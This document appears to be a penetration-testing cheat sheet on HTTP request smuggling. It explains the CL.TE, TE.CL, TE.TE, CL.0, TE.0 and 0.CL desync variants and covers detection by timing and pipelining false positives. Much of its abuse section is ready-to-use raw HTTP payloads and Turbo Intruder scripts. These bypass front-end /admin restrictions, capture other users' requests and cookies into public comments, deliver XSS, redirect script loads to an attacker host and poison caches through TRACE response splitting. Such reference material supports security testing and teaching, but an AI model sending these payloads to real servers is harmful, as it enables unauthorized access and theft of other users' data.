# What is

>This vulnerability occurs when a **desyncronization** between **front-end proxies** and the **back-end** server allows an **attacker** to **send** an HTTP **request** that will be **interpreted** as a **single request** by the **front-end** proxies (load balance/reverse-proxy) and **as 2 request** by the **back-end** server.\
This allows a user to **modify the next request that arrives to the back-end server after his**.

* **Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

* **Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

<br>

>[!TIP]
>* NOTE :
>
> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1 line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.

<br>

----
#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

-   **Front-End (CL):** Processes the request based on the `Content-Length` header.

-   **Back-End (TE):** Processes the request based on the `Transfer-Encoding` header.

-   **Attack Scenario:**

    -   The attacker sends a request where the `Content-Length` header's value does not match the actual content length.

    -   The front-end server forwards the entire request to the back-end, based on the `Content-Length` value.

    -   The back-end server processes the request as chunked due to the `Transfer-Encoding: chunked` header, interpreting the remaining data as a separate, subsequent request.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 30
        Connection: keep-alive
        Transfer-Encoding: chunked

        0

        GET /404 HTTP/1.1
        Foo: x
        ```

####  TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

-   **Front-End (TE):** Processes the request based on the `Transfer-Encoding` header.

-   **Back-End (CL):** Processes the request based on the `Content-Length` header.

-   **Attack Scenario:**

    -   The attacker sends a chunked request where the chunk size (`7b`) and actual content length (`Content-Length: 4`) do not align.

    -   The front-end server, honoring `Transfer-Encoding`, forwards the entire request to the back-end.

    -   The back-end server, respecting `Content-Length`, processes only the initial part of the request (`7b` bytes), leaving the rest as part of an unintended subsequent request.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 4
        Connection: keep-alive
        Transfer-Encoding: chunked

        7b
        GET /404 HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 30

        x=
        0
        ```
        

### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

-   **Servers:** Both support `Transfer-Encoding`, but one can be tricked into ignoring it via obfuscation.

-   **Attack Scenario:**

    -   The attacker sends a request with obfuscated `Transfer-Encoding` headers.

    -   Depending on which server (front-end or back-end) fails to recognize the obfuscation, a CL.TE or TE.CL vulnerability may be exploited.

    -   The unprocessed part of the request, as seen by one of the servers, becomes part of a subsequent request, leading to smuggling.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: xchunked
        Transfer-Encoding : chunked
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding:[tab]chunked
        [space]Transfer-Encoding: chunked
        X: X[\n]Transfer-Encoding: chunked

        Transfer-Encoding
        : chunked
        ```

### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

-   Both servers process the request based solely on the `Content-Length` header.

-   This scenario typically does not lead to smuggling, as there's alignment in how both servers interpret the request length.

-   **Example:**

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 16
    Connection: keep-alive

    Normal Request
    ```

### **CL.0 Scenario**

-   Refers to scenarios where the `Content-Length` header is present and has a value other than zero, indicating that the request body has content. The back-end ignores the `Content-Length` header (which is treated as 0), but the front-end parses it.

-   It's crucial in understanding and crafting smuggling attacks, as it influences how servers determine the end of a request.

-   **Example:**

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 16
    Connection: keep-alive

    Non-Empty Body
    ```

### TE.0 Scenario

-   Like the previous one but using TE
-   Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
-   **Example**:

```http
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```

### `0.CL` Scenario

In a `0.CL` sitation a request is send with a Content-Length like:

```http
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET /404 HTTP/1.1
X: Y
```

And the front-end doesn't take the `Content-Length` into account so it only sends the first request to the backend (until the 7 in the example). However, the backend sees the `Content-Length` and waits for a body that never arrives cause the front-end is already waiting for the response.

However, if there is a request that it's possible to send to the backend that is responded before receiving the body of the request, this deadlock won't occure. In IIS for example this happen sending requests to forbidden words like `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), this way, the initial request will be responded directly and the second requets will contain the request of the victim like:

```http
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```

This is useful to cause a desync, but it won't have any impact until now.


### Breaking the web server

This technique is also useful in scenarios where it's possible to **break a web server while reading the initial HTTP data** but **without closing the connection**. This way, the **body** of the HTTP request will be considered the **next HTTP request**.

For example, as explained in [**this writeup**](https://mizu.re/post/twisty-python), In Werkzeug it was possible to send some **Unicode** characters and it will make the server **break**. However, if the HTTP connection was created with the header **`Connection: keep-alive`**, the body of the request won't be read and the connection will still be open, so the **body** of the request will be treated as the **next HTTP request**.

### Forcing via hop-by-hop headers
>Abusing hop-by-hop headers you could indicate the proxy to **delete the header Content-Length or Transfer-Encoding so a HTTP request >smuggling is possible to abuse**.

```http
Connection: Content-Length
```

----------------------------------------------------------------------------------------------------
<h2 align="center">HTTP Desync Attack Cheat Sheet</h2>

<table>
<tr>
<th width="120">Type</th>
<th width="150">Front-End</th>
<th width="150">Back-End</th>
<th>Description</th>
</tr>

<tr>
<td><code>CL.TE</code></td>
<td>Content-Length</td>
<td>Transfer-Encoding</td>
<td>Front-End trusts CL, Back-End trusts TE.</td>
</tr>

<tr>
<td><code>TE.CL</code></td>
<td>Transfer-Encoding</td>
<td>Content-Length</td>
<td>Front-End trusts TE, Back-End trusts CL.</td>
</tr>

<tr>
<td><code>TE.TE</code></td>
<td>Transfer-Encoding</td>
<td>Transfer-Encoding</td>
<td>TE header obfuscation causes parsing discrepancies.</td>
</tr>

<tr>
<td><code>CL.CL</code></td>
<td>Content-Length</td>
<td>Content-Length</td>
<td>Different interpretation of Content-Length headers.</td>
</tr>

<tr>
<td><code>CL.0</code></td>
<td>Body</td>
<td>No Body</td>
<td>Back-End treats Content-Length as zero.</td>
</tr>

<tr>
<td><code>TE.0</code></td>
<td>Chunked Body</td>
<td>No Body</td>
<td>Back-End ignores Transfer-Encoding.</td>
</tr>

<tr>
<td><code>0.CL</code></td>
<td>No Body</td>
<td>Body</td>
<td>Back-End waits for a body that Front-End never sends.</td>
</tr>

<tr>
<td><code>Upgrade</code></td>
<td>HTTP</td>
<td>WebSocket</td>
<td>Protocol desynchronization.</td>
</tr>

<tr>
<td><code>Response</code></td>
<td>Response</td>
<td>Response</td>
<td>Response queue poisoning / response desync.</td>
</tr>

</table>

--------------------------------

# Finding HTTP Request Smuggling

>Identifying HTTP request smuggling vulnerabilities can often be achieved using timing techniques, which rely on observing how long it takes for the server to respond to manipulated requests. These techniques are particularly useful for detecting CL.TE and TE.CL vulnerabilities. Besides these methods, there are other strategies and tools that can be used to find such vulnerabilities:

## Finding CL.TE Vulnerabilities Using Timing Techniques :

-   **Method:**

    -   Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: chunked
        Connection: keep-alive
        Content-Length: 4

        1
        A
        0
        ```

    -   **Observation:**

        -   The front-end server processes the request based on `Content-Length` and cuts off the message prematurely.
        -   The back-end server, expecting a chunked message, waits for the next chunk that never arrives, causing a delay.
-   **Indicators:**

    -   Timeouts or long delays in response.
    -   Receiving a 400 Bad Request error from the back-end server, sometimes with detailed server information.

## Finding TE.CL Vulnerabilities Using Timing Techniques :

-   **Method:**

    -   Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: chunked
        Connection: keep-alive
        Content-Length: 6

        0
        X
        ```

    -   **Observation:**

        -   The front-end server processes the request based on `Transfer-Encoding` and forwards the entire message.
        -   The back-end server, expecting a message based on `Content-Length`, waits for additional data that never arrives, causing a delay.
---------------------------------------------------------

## Other Methods to Find Vulnerabilities :

-   **Differential Response Analysis:**
    -   Send slightly varied versions of a request and observe if the server responses differ in an unexpected way, indicating a parsing discrepancy.
-   **Using Automated Tools:**
    -   Tools like Burp Suite's 'HTTP Request Smuggler' extension can automatically test for these vulnerabilities by sending various forms of ambiguous requests and analyzing the responses.
-   **Content-Length Variance Tests:**
    -   Send requests with varying `Content-Length` values that are not aligned with the actual content length and observe how the server handles such mismatches.
-   **Transfer-Encoding Variance Tests:**
    -   Send requests with obfuscated or malformed `Transfer-Encoding` headers and monitor how differently the front-end and back-end servers respond to such manipulations.

 ------------------------------------------------------
# The Expect: 100-continue header
Check how this header can help exploiting a http desync in:

### Special Http Headers :

# [![Special HTTP Headers](https://img.shields.io/badge/Read-Special_HTTP_Headers-blue)](Special%20HTTP%20Headers.md)
------------------------------------------------------

## HTTP Request Smuggling Vulnerability Testing

After confirming the effectiveness of timing techniques, it's crucial to verify if client requests can be manipulated. A straightforward method is to attempt poisoning your requests, for instance, making a request to `/` yield a 404 response. The `CL.TE` and `TE.CL` examples previously discussed in Basic Examples demonstrate how to poison a client's request to elicit a 404 response, despite the client aiming to access a different resource.

***Key Considerations***

When testing for request smuggling vulnerabilities by interfering with other requests, bear in mind:

-   **Distinct Network Connections:** The "attack" and "normal" requests should be dispatched over separate network connections. Utilizing the same connection for both doesn't validate the vulnerability's presence.
-   **Consistent URL and Parameters:** Aim to use identical URLs and parameter names for both requests. Modern applications often route requests to specific back-end servers based on URL and parameters. Matching these increases the likelihood that both requests are processed by the same server, a prerequisite for a successful attack.
-   **Timing and Racing Conditions:** The "normal" request, meant to detect interference from the "attack" request, competes against other concurrent application requests. Therefore, send the "normal" request immediately following the "attack" request. Busy applications may necessitate multiple trials for conclusive vulnerability confirmation.
-   **Load Balancing Challenges:** Front-end servers acting as load balancers may distribute requests across various back-end systems. If the "attack" and "normal" requests end up on different systems, the attack won't succeed. This load balancing aspect may require several attempts to confirm a vulnerability.
-   **Unintended User Impact:** If your attack inadvertently impacts another user's request (not the "normal" request you sent for detection), this indicates your attack influenced another application user. Continuous testing could disrupt other users, mandating a cautious approach.


#### Distinguishing HTTP/1.1 pipelining artifacts vs genuine request smuggling

>Connection reuse (keep-alive) and pipelining can easily produce illusions of "smuggling" in testing tools that send multiple requests on the same socket. Learn to separate harmless client-side artifacts from real server-side desync.

### Why pipelining creates classic false positives

HTTP/1.1 reuses a single TCP/TLS connection and concatenates requests and responses on the same stream. In pipelining, the client sends multiple requests back-to-back and relies on in-order responses. A common false-positive is to resend a malformed CL.0-style payload twice on a single connection:

```http
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```

Responses may look like:

```http
HTTP/1.1 200 OK
Content-Type: text/html
```

```http
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```

If the server ignored the malformed `Content_Length`, there is no FE↔BE desync. With reuse, your client actually sent this byte-stream, which the server parsed as two independent requests:

```http
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```

Impact: none. You just desynced your client from the server framing.

-----------------

>[!IMPORTANT]
>
>Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", >Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

--------------------

## Litmus tests: pipelining or real desync?

1.  Disable reuse and re-test
    -   In Burp Intruder/Repeater, turn off HTTP/1 reuse and avoid "Send group in sequence".
    -   In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.
    -   If the behavior disappears, it was likely client-side pipelining, unless you're dealing with connection-locked/stateful targets or client-side desync.
2.  HTTP/2 nested-response check
    -   Send an HTTP/2 request. If the response body contains a complete nested HTTP/1 response, you've proven a backend parsing/desync bug instead of a pure client artifact.
3.  Partial-requests probe for connection-locked front-ends
    -   Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse.
    -   See PortSwigger "Browser‑Powered Desync Attacks" for the connection-locked technique.
4.  State probes
    -   Look for first- vs subsequent-request differences on the same TCP connection (first-request routing/validation).
    -   Burp "HTTP Request Smuggler" includes a connection‑state probe that automates this.
5.  Visualize the wire
    -   Use the Burp "HTTP Hacker" extension to inspect concatenation and message framing directly while experimenting with reuse and partial requests.
  
## Connection‑locked request smuggling (reuse-required)

Some front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists but is conditional on client-side reuse. To distinguish and prove impact:

-   Prove the server-side bug
    -   Use the HTTP/2 nested-response check, or
    -   Use partial-requests to show the FE only reuses upstream when the client does.
-   Show real impact even if direct cross-user socket abuse is blocked:
    -   Cache poisoning: poison shared caches via the desync so responses affect other users.
    -   Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
    -   Bypass FE controls: smuggle restricted paths/methods past the front-end.
    -   Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
-   Operator workflow
    -   Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
    -   Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.
 
    -----------------------------

## Abusing HTTP Request Smuggling


### Circumventing Front-End Security via HTTP Request Smuggling

>Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by >exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited >externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within >a smuggled HTTP request, leaving a loophole for bypassing these restrictions.
>
>Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically >targeting the `/admin` path which is typically guarded by the front-end proxy:

**CL.TE Example**

```http
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

In the CL.TE attack, the `Content-Length` header is leveraged for the initial request, while the subsequent embedded request utilizes the `Transfer-Encoding: chunked` header. The front-end proxy processes the initial `POST` request but fails to inspect the embedded `GET /admin` request, allowing unauthorized access to the `/admin` path.

**TE.CL Example**

```http
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0
```

Conversely, in the TE.CL attack, the initial `POST` request uses `Transfer-Encoding: chunked`, and the subsequent embedded request is processed based on the `Content-Length` header. Similar to the CL.TE attack, the front-end proxy overlooks the smuggled `GET /admin` request, inadvertently granting access to the restricted `/admin` path.

------------------------------------

### Revealing front-end request rewriting

Applications often employ a **front-end server** to modify incoming requests before passing them to the back-end server. A typical modification involves adding headers, such as `X-Forwarded-For: <IP of the client>`, to relay the client's IP to the back-end. Understanding these modifications can be crucial, as it might reveal ways to **bypass protections** or **uncover concealed information or endpoints**.

To investigate how a proxy alters a request, locate a POST parameter that the back-end echoes in the response. Then, craft a request, using this parameter last, similar to the following:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```

In this structure, subsequent request components are appended after `search=`, which is the parameter reflected in the response. This reflection will expose the headers of the subsequent request.

It's important to align the `Content-Length` header of the nested request with the actual content length. Starting with a small value and incrementing gradually is advisable, as too low a value will truncate the reflected data, while too high a value can cause the request to error out.

This technique is also applicable in the context of a TE.CL vulnerability, but the request should terminate with `search=\r\n0`. Regardless of the newline characters, the values will append to the search parameter.

This method primarily serves to understand the request modifications made by the front-end proxy, essentially performing a self-directed investigation.

----------------------------------------------

### Capturing other users' requests

It's feasible to capture the requests of the next user by appending a specific request as the value of a parameter during a POST operation. Here's how this can be accomplished:

By appending the following request as the value of a parameter, you can store the subsequent client's request:

```http
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```

In this scenario, the **comment parameter** is intended to store the contents within a post's comment section on a publicly accessible page. Consequently, the subsequent request's contents will appear as a comment.

However, this technique has limitations. Generally, it captures data only up to the parameter delimiter used in the smuggled request. For URL-encoded form submissions, this delimiter is the `&` character. This means the captured content from the victim user's request will stop at the first `&`, which may even be part of the query string.

Additionally, it's worth noting that this approach is also viable with a TE.CL vulnerability. In such cases, the request should conclude with `search=\r\n0`. Regardless of newline characters, the values will be appended to the search parameter.

-----------------------------------------------------

### Using HTTP request smuggling to exploit reflected XSS

HTTP Request Smuggling can be leveraged to exploit web pages vulnerable to **Reflected XSS**, offering significant advantages:

-   Interaction with the target users is **not required**.
-   Allows the exploitation of XSS in parts of the request that are **normally unattainable**, like HTTP request headers.

In scenarios where a website is susceptible to Reflected XSS through the User-Agent header, the following payload demonstrates how to exploit this vulnerability:

```http
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```

This payload is structured to exploit the vulnerability by:

1.  Initiating a `POST` request, seemingly typical, with a `Transfer-Encoding: chunked` header to indicate the start of smuggling.
2.  Following with a `0`, marking the end of the chunked message body.
3.  Then, a smuggled `GET` request is introduced, where the `User-Agent` header is injected with a script, `<script>alert(1)</script>`, triggering the XSS when the server processes this subsequent request.

By manipulating the `User-Agent` through smuggling, the payload bypasses normal request constraints, thus exploiting the Reflected XSS vulnerability in a non-standard but effective manner.

#### HTTP/0.9

>[!Caution]
>
> In case the user content is reflected in a response with a **`Content-type`** such as **`text/plain`**, preventing the execution of the XSS. If the server support **HTTP/0.9 it might be possible to bypass this**!

The version HTTP/0.9 was previously to the 1.0 and only uses **GET** verbs and **doesn't** respond with **headers**, just the body.

In [*this writeup*](https://mizu.re/post/twisty-python), this was abused with a request smuggling and a **vulnerable endpoint that will reply with the input of the user** to smuggle a request with HTTP/0.9. The parameter that will be reflected in the response contained a **fake HTTP/1.1 response (with headers and body)** so the response will contain valid executable JS code with a `Content-Type` of `text/html`.

-----------------------------

### Exploiting On-site Redirects with HTTP Request Smuggling

Applications often redirect from one URL to another by using the hostname from the `Host` header in the redirect URL. This is common with web servers like Apache and IIS. For instance, requesting a folder without a trailing slash results in a redirect to include the slash:

```http
GET /home HTTP/1.1
Host: normal-website.com`

Results in:

`HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

Though seemingly harmless, this behavior can be manipulated using HTTP request smuggling to redirect users to an external site. For example:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

This smuggled request could cause the next processed user request to be redirected to an attacker-controlled website:

```http
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com`

Results in:

`HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

In this scenario, a user's request for a JavaScript file is hijacked. The attacker can potentially compromise the user by serving malicious JavaScript in response.

-------------------------------------

### Abusing TRACE via HTTP Request Smuggling

**In this post** is suggested that if the server has the method TRACE enabled it could be possible to abuse it with a HTTP Request Smuggling. This is because this method will reflect any header sent to the server as part of the body of the response. For example:

```http
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```

Will send a response such as:

```http
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```

An example on how to abuse this behaviour would be to **smuggle first a HEAD request**. This request will be responded with only the **headers** of a GET request (**`Content-Type`** among them). And smuggle **immediately after the HEAD a TRACE request**, which will be **reflecting the sent dat**a.\
As the HEAD response will be containing a `Content-Length` header, the **response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data** in the response.\
This response will be sent to the next request over the connection, so this could be **used in a cached JS file for example to inject arbitrary JS code**.

### Abusing TRACE via HTTP Response Splitting

Continue following **this post** is suggested another way to abuse the TRACE method. As commented, smuggling a HEAD request and a TRACE request it's possible to **control some reflected data** in the response to the HEAD request. The length of the body of the HEAD request is basically indicated in the Content-Length header and is formed by the response to the TRACE request.

Therefore, the new idea would be that, knowing this Content-Length and the data given in the TRACE response, it's possible to make the TRACE response contains a valid HTTP response after the last byte of the Content-Length, allowing an attacker to completely control the request to the next response (which could be used to perform a cache poisoning).

Example:

```http
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```

Will generate these responses (note how the HEAD response has a Content-Length making the TRACE response part of the HEAD body and once the HEAD Content-Length ends a valid HTTP response is smuggled):

```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert("arbitrary response")</script>
```
------------------------------------------

## Turbo intruder scripts

### CL.TE

From <https://hipotermia.pw/bb/http-desync-idor>

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    attack = '''POST / HTTP/1.1
 Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

    engine.queue(attack)

    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```

### TE.CL

From: <https://hipotermia.pw/bb/http-desync-account-takeover>

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
    engine.queue(attack)

    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

### `Transfer-Encoding` normalization bugs + HTTP/1.0 close-delimited fallback

Another useful pattern is:

1.  The proxy sees that `Transfer-Encoding` is present, so it strips `Content-Length`.
2.  The proxy **fails to normalize TE correctly**.
3.  The proxy now has **no recognized framing** and falls back to **close-delimited request bodies** for HTTP/1.0.
4.  The backend correctly understands TE and treats bytes after `0\r\n\r\n` as a new request.

Common ways to trigger this:

-   **Comma-separated TE list not parsed**:

```http
GET / HTTP/1.0
Host: target.com
Connection: keep-alive
Transfer-Encoding: identity, chunked
Content-Length: 29

0

GET /admin HTTP/1.1
X:
```

-   **Duplicate TE headers not merged**:

```http
POST /legit HTTP/1.0
Host: target.com
Connection: keep-alive
Transfer-Encoding: identity
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X:
```
--------------------------------------------
